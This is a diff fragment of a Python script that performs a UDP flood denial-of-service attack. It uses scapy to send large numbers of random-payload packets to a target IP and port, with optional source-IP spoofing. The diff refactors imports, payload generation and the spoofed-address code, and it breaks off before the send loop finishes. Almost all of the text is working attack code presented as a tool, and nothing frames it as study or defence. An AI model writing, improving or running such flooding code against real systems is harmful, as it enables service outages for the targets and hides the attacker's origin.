@@ -1,25 +1,26 @@
 #!/usr/bin/env python3
 import argparse
+import os
 import random
 import socket
 import threading
 import time
-from scapy.all import send, IP, UDP, RandIP
+from scapy.all import send
+from scapy.layers.inet import IP, UDP
 
 def udp_flood(target_ip, target_port, num_packets=1000, packet_size=1024, spoof=False):
     """Send UDP packets to target to perform a UDP flood attack"""
     print(f"Starting UDP flood attack on {target_ip}:{target_port}")
-    
     # Generate random payload once for efficiency
-    payload = random._urandom(packet_size)
+    payload = os.urandom(packet_size)
     
     total_sent = 0
     for _ in range(num_packets):
         if spoof:
-            source_ip = RandIP()
+            # Generate random IP for spoofing
+            source_ip = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
         else:
             source_ip = socket.gethostbyname(socket.gethostname())
-        
         source_port = random.randint(1, 65535)
         
         # Create UDP packet
